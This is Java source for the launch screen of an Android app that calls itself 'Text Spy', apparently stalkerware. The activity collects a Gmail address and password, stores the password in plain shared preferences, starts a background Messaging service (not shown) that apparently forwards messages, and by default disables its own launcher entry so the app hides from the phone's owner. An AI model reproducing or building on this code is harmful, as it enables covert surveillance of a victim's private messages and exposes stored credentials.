package com.twoonefoursoft.messaging;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Bundle;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.TextView;

public class Starter extends Activity implements OnClickListener{

	EditText email, password, number, msg;
	TextView mailer, error, pw;
	CheckBox remove;
	String errorList = "";
	public static String saved = "EmailInfo";
	SharedPreferences prefs;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
		
		setContentView(R.layout.main);
		setVars();
		
		prefs = getSharedPreferences(saved, 0);
		
	}
	
	public void setVars() {
		Button submit = (Button) findViewById(R.id.start);
		Button test = (Button) findViewById(R.id.test);
		
		remove = (CheckBox) findViewById(R.id.remover);
		remove.setChecked(true);
		mailer = (TextView) findViewById(R.id.mailer);
		error = (TextView) findViewById(R.id.errorText);
		pw = (TextView) findViewById(R.id.tvPW);
		email = (EditText) findViewById(R.id.email);
		password = (EditText) findViewById(R.id.pass);
		msg = (EditText) findViewById(R.id.donemessage);
		number = (EditText) findViewById(R.id.usernumber);
		submit.setOnClickListener(this);
		test.setOnClickListener(this);
	}
	
	@Override
	public void onClick(View v) {
		
		switch(v.getId()) {
		
		case R.id.start:
			String emailAdd = email.getText().toString();
			String pass = password.getText().toString();
			String message = msg.getText().toString();
			message = message.toLowerCase();
			String phone = number.getText().toString();
			
			if(!emailAdd.endsWith("@gmail.com")) {
				mailer.setTextColor(Color.RED);
				errorList = "Please enter a gmail email address";
			}
			else
				mailer.setTextColor(Color.WHITE);
			
			if(pass.contentEquals("")) {
				if (errorList.compareTo("") == 0) {
					errorList = "Please enter the password for entered gmail account";
				}
				errorList = errorList + " and a password for gmail account";
				pw.setTextColor(Color.RED);
			}
			else
				pw.setTextColor(Color.WHITE);
			
			if(!errorList.contentEquals("")) {
				error.setText(errorList);
				error.setTextColor(Color.RED);
				break;
			}
			
			SharedPreferences.Editor editor = prefs.edit();
			editor.putString("email", emailAdd);
			editor.putString("password", pass);
			editor.putString("msg", message);
			editor.putString("number", phone);
			editor.putBoolean("send", true);
			editor.commit();
			
			startService(new Intent(this, Messaging.class));
			
			if(remove.isChecked()) {
				ComponentName componentToDisable = new ComponentName("com.twoonefoursoft.messaging", "com.twoonefoursoft.messaging.Starter");
				getPackageManager().setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
			}
			finish();
			break;
			
		case R.id.test:
			String eAdd = email.getText().toString();
			String passw = password.getText().toString();
			String messageTest = msg.getText().toString();
			String phoneNum = number.getText().toString();
			
			Mail m = new Mail(eAdd, passw);
		      String[] toArr = {eAdd };
		      
		      m.setTo(toArr);
		      m.setFrom("spyMessage@spy.com");
		      m.setSubject("Test Message Sent From Text Spy");
		      m.setBody("This is a test message, the stop message you entered is " + messageTest + 
		    		  " and the phone number you entered to receive that text from is " + phoneNum);
		      try {
					m.send();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			break;
		
		}
		
	}

}
